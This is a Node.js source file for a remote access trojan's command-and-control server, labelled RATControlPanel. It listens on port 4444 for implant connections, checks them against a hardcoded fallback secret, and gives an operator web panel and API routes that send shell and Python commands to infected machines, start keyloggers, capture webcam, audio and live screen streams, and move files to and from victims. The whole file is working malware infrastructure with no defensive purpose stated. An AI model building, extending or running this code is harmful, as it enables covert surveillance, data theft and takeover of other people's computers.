const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const net = require('net');
const readline = require('readline');
const WebSocket = require('ws');

// Load environment variables
require('dotenv').config();

// Configuration
const SERVER_IP = process.env.SERVER_IP || "127.0.0.1";
const SERVER_PORT = process.env.SERVER_PORT || 4444;
const WEB_PORT = process.env.WEB_PORT || 3001;
const BUFFER_SIZE = 8192;
const MAX_CLIENTS = 10;
const REQUIRE_AUTH = true;
const SECRET_KEY = process.env.SECRET_KEY || "karan.bagal.96k";
const AUTH_TOKEN = crypto.createHash('sha256').update(SECRET_KEY).digest('hex');
const CONNECTION_TIMEOUT = 5000;
const LOG_FILE = "server_enhanced.log";

class RATControlPanel {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.io = socketIo(this.server, {
            cors: {
                origin: "*",
                methods: ["GET", "POST"]
            }
        });
        
        this.ratServer = null;
        this.wsServer = null;
        this.clients = new Map(); // client_id: {socket, address, authenticated, last_heartbeat, info}
        this.clientCounter = 0;
        this.running = true;
        
        this.setupMiddleware();
        this.setupRoutes();
        this.setupSocketIO();
        this.setupRATServer();
        this.setupWebSocketServer();
        this.ensureDirectories();
        this.setupLogging();
    }

    setupMiddleware() {
        // Security middleware
        this.app.use(helmet());
        this.app.use(cors());
        this.app.use(compression());
        this.app.use(morgan('combined'));
        
        // Body parsing
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));
        
        // Static files
        this.app.use('/downloads', express.static(path.join(__dirname, 'downloads')));
        this.app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
    }

    setupRoutes() {
        // API Routes
        this.app.get('/api/health', (req, res) => {
            res.json({ status: 'ok', timestamp: new Date().toISOString() });
        });

        this.app.get('/api/clients', (req, res) => {
            const clientsList = Array.from(this.clients.entries()).map(([id, info]) => ({
                id,
                address: info.address,
                authenticated: info.authenticated,
                last_heartbeat: info.last_heartbeat,
                info: info.info || {}
            }));
            res.json(clientsList);
        });

        this.app.post('/api/command', (req, res) => {
            const { clientId, command } = req.body;
            if (!clientId || !command) {
                return res.status(400).json({ error: 'Missing clientId or command' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "command", data: { command } });
            res.json({ success, message: success ? 'Command sent' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/python', (req, res) => {
            const { clientId, code } = req.body;
            if (!clientId || !code) {
                return res.status(400).json({ error: 'Missing clientId or code' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "python", code });
            res.json({ success, message: success ? 'Python code sent' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/webcam', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "webcam" });
            res.json({ success, message: success ? 'Webcam capture requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/audio', (req, res) => {
            const { clientId, duration = 10 } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "audio", duration });
            res.json({ success, message: success ? 'Audio recording requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/keylog', (req, res) => {
            const { clientId, action } = req.body; // action: 'start', 'stop', 'get'
            if (!clientId || !action) {
                return res.status(400).json({ error: 'Missing clientId or action' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "keylog", action });
            res.json({ success, message: success ? `Keylog ${action} requested` : 'Client not found or not authenticated' });
        });

        this.app.post('/api/files/list', (req, res) => {
            const { clientId, path } = req.body;
            if (!clientId || !path) {
                return res.status(400).json({ error: 'Missing clientId or path' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "file_list", path });
            res.json({ success, message: success ? 'File list requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/files/list_advanced', (req, res) => {
            const { clientId, path, recursive, include_hidden, max_depth } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const options = {
                path: path || ".",
                recursive: recursive || false,
                include_hidden: include_hidden || false,
                max_depth: max_depth || 10
            };
            
            const success = this.sendCommandToClient(clientId, { type: "list_files", options });
            res.json({ success, message: success ? 'Advanced file list requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/files/download', (req, res) => {
            const { clientId, filepath } = req.body;
            if (!clientId || !filepath) {
                return res.status(400).json({ error: 'Missing clientId or filepath' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "file_download", filepath });
            res.json({ success, message: success ? 'File download requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/files/upload', (req, res) => {
            const { clientId, filepath, content } = req.body;
            if (!clientId || !filepath || !content) {
                return res.status(400).json({ error: 'Missing clientId, filepath, or content' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "file_upload", file_data: { path: filepath, content } });
            res.json({ success, message: success ? 'File upload requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/system/status', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "system_status" });
            res.json({ success, message: success ? 'System status requested' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/client/kill', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "kill" });
            res.json({ success, message: success ? 'Kill command sent' : 'Client not found or not authenticated' });
        });

        this.app.get('/api/screenshots', (req, res) => {
            const screenshotsDir = path.join(__dirname, 'downloads');
            try {
                const files = fs.readdirSync(screenshotsDir)
                    .filter(file => file.startsWith('screenshot_'))
                    .map(file => ({
                        name: file,
                        path: `/downloads/${file}`,
                        size: fs.statSync(path.join(screenshotsDir, file)).size,
                        created: fs.statSync(path.join(screenshotsDir, file)).birthtime
                    }))
                    .sort((a, b) => b.created - a.created);
                res.json(files);
            } catch (error) {
                res.status(500).json({ error: 'Failed to read screenshots' });
            }
        });

        this.app.post('/api/live-stream/start', (req, res) => {
            const { clientId, interval = 1000 } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "live_stream", config: { action: 'start', interval } });
            res.json({ success, message: success ? 'Live stream started' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/live-stream/stop', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "live_stream", config: { action: 'stop' } });
            res.json({ success, message: success ? 'Live stream stopped' : 'Client not found or not authenticated' });
        });

        this.app.post('/api/test-capture', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }
            
            const success = this.sendCommandToClient(clientId, { type: "test_capture" });
            res.json({ success, message: success ? 'Local capture test started' : 'Client not found or not authenticated' });
        });

        // Serve React app in production
        if (process.env.NODE_ENV === 'production') {
            this.app.use(express.static(path.join(__dirname, '../client-web/build')));
            this.app.get('*', (req, res) => {
                res.sendFile(path.join(__dirname, '../client-web/build/index.html'));
            });
        }
    }

    setupSocketIO() {
        this.io.on('connection', (socket) => {
            console.log('Web client connected:', socket.id);
            
            // Send current clients list
            socket.emit('clients-update', Array.from(this.clients.entries()).map(([id, info]) => ({
                id,
                address: info.address,
                authenticated: info.authenticated,
                last_heartbeat: info.last_heartbeat,
                info: info.info || {}
            })));

            socket.on('send-command', (data) => {
                const { clientId, command } = data;
                const success = this.sendCommandToClient(clientId, { type: "command", data: { command } });
                socket.emit('command-result', { success, clientId, command });
            });

            socket.on('disconnect', () => {
                console.log('Web client disconnected:', socket.id);
            });
        });
    }

    setupRATServer() {
        this.ratServer = net.createServer((socket) => {
            this.handleNewConnection(socket);
        });

        this.ratServer.listen(SERVER_PORT, SERVER_IP);
        
        this.ratServer.on('error', (error) => {
            this.log('error', `RAT Server error: ${error.message}`);
        });

        this.ratServer.on('listening', () => {
            this.log('info', `RAT Server listening on ${SERVER_IP}:${SERVER_PORT}`);
            console.log(`[+] RAT Server listening on ${SERVER_IP}:${SERVER_PORT}`);
        });
    }

    setupWebSocketServer() {
        // Create WebSocket server attached to the HTTP server
        this.wsServer = new WebSocket.Server({ 
            server: this.server,
            path: '/ws'
        });

        this.wsServer.on('connection', (ws, req) => {
            this.handleNewWebSocketConnection(ws, req);
        });

        this.wsServer.on('error', (error) => {
            this.log('error', `WebSocket Server error: ${error.message}`);
        });

        console.log('[+] WebSocket Server setup complete');
    }

    ensureDirectories() {
        const dirs = ['downloads', 'uploads', 'logs'];
        dirs.forEach(dir => {
            const dirPath = path.join(__dirname, dir);
            if (!fs.existsSync(dirPath)) {
                fs.mkdirSync(dirPath, { recursive: true });
            }
        });
    }

    setupLogging() {
        this.logStream = fs.createWriteStream(path.join(__dirname, LOG_FILE), { flags: 'a' });
    }

    log(level, message) {
        const timestamp = new Date().toISOString();
        const logMessage = `${timestamp} - ${level.toUpperCase()} - ${message}`;
        
        console.log(logMessage);
        this.logStream.write(logMessage + '\n');
        
        // Emit to web clients
        this.io.emit('log', { level, message, timestamp });
    }

    handleNewConnection(socket) {
        this.clientCounter++;
        const clientId = `Client${this.clientCounter}`;
        const clientAddr = `${socket.remoteAddress}:${socket.remotePort}`;
        
        console.log(`[+] New RAT connection from ${clientAddr}`);
        this.log('info', `[${clientId}] Connected from ${clientAddr}`);
        
        // Don't set timeout - let the client stay connected indefinitely
        // socket.setTimeout(CONNECTION_TIMEOUT);
        
        this.clients.set(clientId, {
            socket: socket,
            address: clientAddr,
            authenticated: false,
            last_heartbeat: Date.now(),
            info: {}
        });
        
        if (REQUIRE_AUTH) {
            this.handleAuthentication(clientId, socket);
        } else {
            this.clients.get(clientId).authenticated = true;
            socket.write(JSON.stringify({ status: "ok" }));
            console.log(`[✓] ${clientId} authenticated.`);
            this.handleClientCommunication(clientId, socket);
        }
        
        this.broadcastClientsUpdate();
    }

    handleNewWebSocketConnection(ws, req) {
        this.clientCounter++;
        const clientId = `Client${this.clientCounter}`;
        const clientAddr = req.socket.remoteAddress || 'unknown';
        
        console.log(`[+] New WebSocket connection from ${clientAddr}`);
        this.log('info', `[${clientId}] WebSocket connected from ${clientAddr}`);
        
        this.clients.set(clientId, {
            socket: ws,
            address: clientAddr,
            authenticated: false,
            last_heartbeat: Date.now(),
            info: {},
            connectionType: 'websocket'
        });
        
        if (REQUIRE_AUTH) {
            this.handleWebSocketAuthentication(clientId, ws);
        } else {
            this.clients.get(clientId).authenticated = true;
            ws.send(JSON.stringify({ status: "ok" }));
            console.log(`[✓] ${clientId} authenticated.`);
            this.handleWebSocketCommunication(clientId, ws);
        }
        
        this.broadcastClientsUpdate();
    }

    handleAuthentication(clientId, socket) {
        socket.once('data', (data) => {
            try {
                const message = JSON.parse(data.toString());
                if (message.auth === AUTH_TOKEN) {
                    this.clients.get(clientId).authenticated = true;
                    socket.write(JSON.stringify({ status: "ok" }));
                    console.log(`[✓] ${clientId} authenticated.`);
                    this.broadcastClientsUpdate();
                    
                    // Start the main communication handler after authentication
                    this.handleClientCommunication(clientId, socket);
                } else {
                    socket.write(JSON.stringify({ status: "unauthorized" }));
                    socket.destroy();
                    this.clients.delete(clientId);
                }
            } catch (error) {
                this.log('error', `[${clientId}] Authentication error: ${error.message}`);
                socket.destroy();
                this.clients.delete(clientId);
            }
        });
    }

    handleWebSocketAuthentication(clientId, ws) {
        ws.once('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                if (message.type === 'auth' && message.token === AUTH_TOKEN) {
                    this.clients.get(clientId).authenticated = true;
                    this.clients.get(clientId).info = message.client_info || {};
                    ws.send(JSON.stringify({ status: "ok" }));
                    console.log(`[✓] ${clientId} authenticated via WebSocket.`);
                    this.broadcastClientsUpdate();
                    
                    // Start the main communication handler after authentication
                    this.handleWebSocketCommunication(clientId, ws);
                } else {
                    ws.send(JSON.stringify({ status: "unauthorized" }));
                    ws.close();
                    this.clients.delete(clientId);
                }
            } catch (error) {
                this.log('error', `[${clientId}] WebSocket Authentication error: ${error.message}`);
                ws.close();
                this.clients.delete(clientId);
            }
        });
    }

    handleClientCommunication(clientId, socket) {
        let buffer = '';
        
        socket.on('data', (data) => {
            try {
                buffer += data.toString();
                
                let message;
                try {
                    message = JSON.parse(buffer);
                    buffer = '';
                } catch (error) {
                    return;
                }
                
                this.processClientMessage(clientId, message);
                
            } catch (error) {
                this.log('error', `[${clientId}] Data processing error: ${error.message}`);
            }
        });
        
        socket.on('error', (error) => {
            this.log('error', `[${clientId}] Socket error: ${error.message}`);
            this.removeClient(clientId);
        });
        
        socket.on('close', () => {
            console.log(`[-] ${clientId} disconnected.`);
            this.log('info', `[${clientId}] Disconnected`);
            this.removeClient(clientId);
        });
        
        // Remove timeout handler since we're not using socket timeout
        // socket.on('timeout', () => {
        //     this.log('warning', `[${clientId}] Connection timeout`);
        //     socket.destroy();
        //     this.removeClient(clientId);
        // });
    }

    handleWebSocketCommunication(clientId, ws) {
        ws.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                this.processClientMessage(clientId, message);
            } catch (error) {
                this.log('error', `[${clientId}] WebSocket message processing error: ${error.message}`);
            }
        });
        
        ws.on('error', (error) => {
            this.log('error', `[${clientId}] WebSocket error: ${error.message}`);
            this.removeClient(clientId);
        });
        
        ws.on('close', () => {
            console.log(`[-] ${clientId} WebSocket disconnected.`);
            this.log('info', `[${clientId}] WebSocket disconnected`);
            this.removeClient(clientId);
        });
    }

    processClientMessage(clientId, message) {
        if (message.output) {
            console.log(`[${clientId}] Output:\n${message.output}`);
            this.log('info', `[${clientId}] Command output received`);
            this.io.emit('client-output', { clientId, output: message.output });
        } else if (message.error) {
            console.log(`[${clientId}] Error: ${message.error}`);
            this.log('error', `[${clientId}] Error: ${message.error}`);
            this.io.emit('client-error', { clientId, error: message.error });
        } else if (message.screenshot) {
            this.handleScreenshot(clientId, message.screenshot);
        } else if (message.webcam) {
            this.handleWebcam(clientId, message.webcam);
        } else if (message.audio) {
            this.handleAudio(clientId, message.audio);
        } else if (message.keylog) {
            this.handleKeylog(clientId, message.keylog);
        } else if (message.file_upload) {
            this.handleFileUpload(clientId, message.file_upload);
        } else if (message.file_list) {
            this.handleFileList(clientId, message.file_list);
        } else if (message.list_files_progress) {
            this.handleListFilesProgress(clientId, message.list_files_progress);
        } else if (message.list_files_complete) {
            this.handleListFilesComplete(clientId, message.list_files_complete);
        } else if (message.list_files_error) {
            this.handleListFilesError(clientId, message.list_files_error);
        } else if (message.live_stream_data) {
            this.handleLiveStreamData(clientId, message.live_stream_data);
        } else if (message.system_status) {
            this.handleSystemStatus(clientId, message.system_status);
        } else if (message.python_output) {
            this.handlePythonOutput(clientId, message.python_output);
        } else if (message.info) {
            // Update client system info
            this.clients.get(clientId).info = message.info;
            this.broadcastClientsUpdate();
            this.io.emit('client-info-update', { clientId, info: message.info });
        } else if (message.heartbeat) {
            // Update last heartbeat time
            this.clients.get(clientId).last_heartbeat = Date.now();
            this.broadcastClientsUpdate();
        } else {
            console.log(`[${clientId}] Unknown message: ${JSON.stringify(message)}`);
            this.log('warning', `[${clientId}] Unknown message type`);
        }
    }

    handleScreenshot(clientId, base64Data) {
        try {
            const buffer = Buffer.from(base64Data, 'base64');
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `screenshot_${clientId}_${timestamp}.png`;
            const filepath = path.join(__dirname, 'downloads', filename);
            
            fs.writeFileSync(filepath, buffer);
            console.log(`[${clientId}] Screenshot saved: ${filename}`);
            this.log('info', `[${clientId}] Screenshot saved: ${filename}`);
            
            // Notify web clients
            this.io.emit('screenshot-saved', { 
                clientId, 
                filename, 
                path: `/downloads/${filename}`,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] Screenshot save error: ${error.message}`);
        }
    }

    handleWebcam(clientId, base64Data) {
        try {
            const buffer = Buffer.from(base64Data, 'base64');
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `webcam_${clientId}_${timestamp}.jpg`;
            const filepath = path.join(__dirname, 'downloads', filename);
            
            fs.writeFileSync(filepath, buffer);
            console.log(`[${clientId}] Webcam capture saved: ${filename}`);
            this.log('info', `[${clientId}] Webcam capture saved: ${filename}`);
            
            this.io.emit('webcam-saved', { 
                clientId, 
                filename, 
                path: `/downloads/${filename}`,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] Webcam save error: ${error.message}`);
        }
    }

    handleAudio(clientId, base64Data) {
        try {
            const buffer = Buffer.from(base64Data, 'base64');
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `audio_${clientId}_${timestamp}.wav`;
            const filepath = path.join(__dirname, 'downloads', filename);
            
            fs.writeFileSync(filepath, buffer);
            console.log(`[${clientId}] Audio recording saved: ${filename}`);
            this.log('info', `[${clientId}] Audio recording saved: ${filename}`);
            
            this.io.emit('audio-saved', { 
                clientId, 
                filename, 
                path: `/downloads/${filename}`,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] Audio save error: ${error.message}`);
        }
    }

    handleKeylog(clientId, keylogData) {
        try {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `keylog_${clientId}_${timestamp}.txt`;
            const filepath = path.join(__dirname, 'downloads', filename);
            
            fs.writeFileSync(filepath, keylogData);
            console.log(`[${clientId}] Keylog data saved: ${filename}`);
            this.log('info', `[${clientId}] Keylog data saved: ${filename}`);
            
            this.io.emit('keylog-saved', { 
                clientId, 
                filename, 
                path: `/downloads/${filename}`,
                content: keylogData, // Send the actual content
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] Keylog save error: ${error.message}`);
        }
    }

    handleFileUpload(clientId, fileData) {
        try {
            const { filename, content, path: filePath } = fileData;
            const buffer = Buffer.from(content, 'base64');
            const uploadPath = path.join(__dirname, 'uploads', filename);
            
            fs.writeFileSync(uploadPath, buffer);
            console.log(`[${clientId}] File uploaded: ${filename} from ${filePath}`);
            this.log('info', `[${clientId}] File uploaded: ${filename} from ${filePath}`);
            
            this.io.emit('file-uploaded', { 
                clientId, 
                filename, 
                originalPath: filePath,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] File upload error: ${error.message}`);
        }
    }

    handleFileList(clientId, fileList) {
        try {
            console.log(`[${clientId}] File list received for: ${fileList.path}`);
            this.log('info', `[${clientId}] File list received for: ${fileList.path}`);
            
            this.io.emit('file-list', { 
                clientId, 
                path: fileList.path,
                files: fileList.files,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] File list error: ${error.message}`);
        }
    }

    handleListFilesProgress(clientId, progressData) {
        try {
            console.log(`[${clientId}] List files progress: ${progressData.file.name} in ${progressData.path}`);
            this.log('info', `[${clientId}] List files progress: ${progressData.file.name}`);
            
            this.io.emit('list-files-progress', { 
                clientId, 
                path: progressData.path,
                file: progressData.file,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] List files progress error: ${error.message}`);
        }
    }

    handleListFilesComplete(clientId, completeData) {
        try {
            console.log(`[${clientId}] List files complete: ${completeData.total_files} files in ${completeData.path}`);
            this.log('info', `[${clientId}] List files complete: ${completeData.total_files} files`);
            
            this.io.emit('list-files-complete', { 
                clientId, 
                path: completeData.path,
                total_files: completeData.total_files,
                recursive: completeData.recursive,
                include_hidden: completeData.include_hidden,
                max_depth: completeData.max_depth,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] List files complete error: ${error.message}`);
        }
    }

    handleListFilesError(clientId, errorData) {
        try {
            console.log(`[${clientId}] List files error: ${errorData.error} in ${errorData.path}`);
            this.log('error', `[${clientId}] List files error: ${errorData.error}`);
            
            this.io.emit('list-files-error', { 
                clientId, 
                path: errorData.path,
                error: errorData.error,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] List files error handler error: ${error.message}`);
        }
    }

    handleSystemStatus(clientId, status) {
        try {
            console.log(`[${clientId}] System status: CPU ${status.cpu}%, RAM ${status.ram}%`);
            this.log('info', `[${clientId}] System status updated`);
            
            // Update client info with system status
            const clientInfo = this.clients.get(clientId);
            if (clientInfo) {
                clientInfo.systemStatus = status;
                this.broadcastClientsUpdate();
            }
            
            this.io.emit('system-status', { 
                clientId, 
                status,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] System status error: ${error.message}`);
        }
    }

    handlePythonOutput(clientId, pythonData) {
        try {
            console.log(`[${clientId}] Python execution output:\n${pythonData.output}`);
            this.log('info', `[${clientId}] Python code executed`);
            
            this.io.emit('python-output', { 
                clientId, 
                output: pythonData.output,
                error: pythonData.error,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            this.log('error', `[${clientId}] Python output error: ${error.message}`);
        }
    }

    handleLiveStreamData(clientId, streamData) {
        try {
            console.log(`[${clientId}] Live stream data received`);
            this.log('info', `[${clientId}] Live stream data received`);
            
            // Enhanced live stream data with additional metadata
            const enhancedData = {
                clientId, 
                imageData: streamData.imageData,
                width: streamData.width || null,
                height: streamData.height || null,
                timestamp: streamData.timestamp || new Date().toISOString(),
                serverTimestamp: new Date().toISOString()
            };
            
            this.io.emit('live-stream-data', enhancedData);
        } catch (error) {
            this.log('error', `[${clientId}] Live stream data error: ${error.message}`);
        }
    }

    removeClient(clientId) {
        const clientInfo = this.clients.get(clientId);
        if (clientInfo) {
            try {
                if (clientInfo.socket) { // Check if it's a socket.io socket or a ws socket
                    if (clientInfo.socket.id) { // For socket.io
                        this.io.sockets.sockets.get(clientInfo.socket.id).disconnect();
                    } else if (clientInfo.socket.readyState === 'open') { // For ws
                        clientInfo.socket.close();
                    }
                }
            } catch (error) {
                // Ignore cleanup errors
            }
            this.clients.delete(clientId);
            this.broadcastClientsUpdate();
        }
    }

    sendCommandToClient(clientId, commandDict) {
        try {
            const clientInfo = this.clients.get(clientId);
            if (clientInfo && clientInfo.authenticated) {
                if (clientInfo.connectionType === 'websocket') {
                    // WebSocket connection
                    if (clientInfo.socket.readyState === WebSocket.OPEN) {
                        clientInfo.socket.send(JSON.stringify(commandDict));
                    } else {
                        console.log(`[!] WebSocket for ${clientId} is not open`);
                        return false;
                    }
                } else {
                    // TCP socket connection
                    clientInfo.socket.write(JSON.stringify(commandDict));
                }
                
                // Log the command being sent
                const commandName = commandDict.type || commandDict.cmd || Object.keys(commandDict)[0];
                this.log('info', `[${clientId}] Command sent: ${commandName}`);
                
                return true;
            } else {
                console.log(`[!] Client ${clientId} not found or not authenticated.`);
                return false;
            }
        } catch (error) {
            console.log(`[!] Error sending command to ${clientId}: ${error.message}`);
            this.log('error', `[${clientId}] Command send error: ${error.message}`);
            return false;
        }
    }

    broadcastClientsUpdate() {
        const clientsList = Array.from(this.clients.entries()).map(([id, info]) => ({
            id,
            address: info.address,
            authenticated: info.authenticated,
            last_heartbeat: info.last_heartbeat,
            info: info.info || {}
        }));
        this.io.emit('clients-update', clientsList);
    }

    start() {
        this.server.listen(WEB_PORT, () => {
            this.log('info', `Web server listening on port ${WEB_PORT}`);
            console.log(`[+] Web server listening on port ${WEB_PORT}`);
            console.log(`[+] Control panel available at http://localhost:${WEB_PORT}`);
        });
    }

    stop() {
        this.running = false;
        
        // Close all client connections
        for (const [clientId, clientInfo] of this.clients) {
            try {
                if (clientInfo.socket) { // Check if it's a socket.io socket or a ws socket
                    if (clientInfo.socket.id) { // For socket.io
                        this.io.sockets.sockets.get(clientInfo.socket.id).disconnect();
                    } else if (clientInfo.socket.readyState === 'open') { // For ws
                        clientInfo.socket.close();
                    }
                }
            } catch (error) {
                // Ignore errors during cleanup
            }
        }
        this.clients.clear();
        
        // Close servers
        if (this.ratServer) {
            this.ratServer.close();
        }
        if (this.server) {
            this.server.close();
        }
        if (this.wsServer) { // Close WebSocket server
            this.wsServer.close();
        }
        
        // Close log stream
        if (this.logStream) {
            this.logStream.end();
        }
        
        this.log('info', 'Server stopped.');
        process.exit(0);
    }
}

// Handle process termination
process.on('SIGINT', () => {
    console.log('\n[!] Server stopping...');
    if (global.ratPanel) {
        global.ratPanel.stop();
    }
});

process.on('SIGTERM', () => {
    console.log('\n[!] Server stopping...');
    if (global.ratPanel) {
        global.ratPanel.stop();
    }
});

// Start the server
if (require.main === module) {
    const ratPanel = new RATControlPanel();
    global.ratPanel = ratPanel;
    ratPanel.start();
}

module.exports = RATControlPanel; 